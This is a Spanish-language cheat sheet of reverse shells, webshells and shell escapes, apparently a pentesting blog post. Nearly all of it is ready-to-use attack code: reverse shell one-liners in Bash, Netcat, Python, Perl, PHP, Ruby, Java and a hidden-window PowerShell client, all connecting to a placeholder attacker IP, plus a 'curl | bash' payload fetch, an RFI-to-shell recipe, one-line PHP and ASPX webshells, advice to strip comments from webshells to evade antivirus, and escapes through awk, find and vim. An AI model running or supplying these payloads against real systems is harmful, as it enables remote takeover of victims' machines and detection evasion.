---
title: "Chuleta de Reverse Shells, WebShells y Escapes"
pubDate: '2026-08-26'
---

## ¿Qué es una Reverse Shell?
Una **Reverse Shell** (shell reversa) ocurre cuando la máquina víctima inicia una conexión hacia la máquina del atacante. Es el método preferido para obtener control remoto porque suele saltar las restricciones de los firewalls (que bloquean conexiones entrantes pero permiten salientes).

### Requisitos previos
1. **Ejecución de comandos:** Necesitas un vector de RCE (URL, Parámetro, RFI, etc.).
2. **Listener (Escucha):** Tu máquina debe estar esperando la conexión:
   ```bash
   nc -lvnp 4444
   ```

---

## 🐚 1. One-Liners de Reverse Shells

### Bash TCP (La más fiable)
```bash
bash -i >& /dev/tcp/<TU_IP>/4444 0>&1
bash -c 'bash -i >& /dev/tcp/<TU_IP>/4444 0>&1'
```

### Netcat
```bash
# Con soporte para -e
nc -e /bin/bash <TU_IP> 4444

# Versión segura con pipe con nombre (Mkfifo)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <TU_IP> 4444 >/tmp/f
```

### Python
```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<TU_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<TU_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Perl
```bash
perl -e 'use Socket;$i="<TU_IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PHP
```bash
php -r '$sock=fsockopen("<TU_IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("<TU_IP>",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Java
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<TU_IP>/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

---

## 🪟 2. Windows (PowerShell)

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('<TU_IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## 🌐 3. Web Exploitation (RCE via URL)

### Método "Curl | Bash" (Muy sigiloso)
1. En tu Kali, crea un archivo `index.html` con tu reverse shell en Bash.
2. Levanta un servidor web: `python3 -m http.server 80`.
3. En la víctima ejecuta: `curl <TU_IP> | bash`.

### De RFI a Reverse Shell
1. Prepara `php-reverse-shell.php` (de pentestmonkey) configurando tu IP y puerto.
2. Levanta el servidor web en tu máquina.
3. Invoca la URL vulnerable: `http://target.com/index.php?page=http://<TU_IP>/rev.php`.

---

## 📁 4. WebShells Especializadas

### WebShells Mínimas de Una Línea
* **PHP:** `<?php system($_GET['cmd']); ?>`
* **ASPX:** `<% response.write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()) %>`

### Colección de WebShells de Laudanum
Ubicación en Kali/Parrot: `/usr/share/laudanum/`
> **Importante:** Muchos archivos de Laudanum tienen una directiva de seguridad interna (`allowed IP` o `IP whitelist`). Se debe editar el script e introducir tu IP atacante antes de subirlo, de lo contrario rechazará tus peticiones.

### Antak WebShell (ASPX para Windows / IIS)
Ubicación: `/usr/share/nishang/Antak-WebShell/antak.aspx`
* Ofrece una consola PowerShell completa integrada en el navegador web.
* Requiere editar el archivo para definir las credenciales de acceso (`user` y `password`).
* Se recomienda eliminar comentarios del archivo para reducir detección por antivirus.

---

## ⚡ 5. Spawning y Escape hacia Shell Interactiva

Si estás atrapado en una sesión limitada o dentro de una aplicación:

```bash
# Spawning básico
/bin/sh -i
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
lua -e 'os.execute("/bin/sh")'

# Escape mediante AWK
awk 'BEGIN {system("/bin/sh")}'

# Escape mediante Find
find . -exec /bin/sh \; -quit
find / -name test -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

# Escape dentro de VIM
vim -c ':!/bin/sh'
# O dentro del editor:
:set shell=/bin/sh
:shell
```
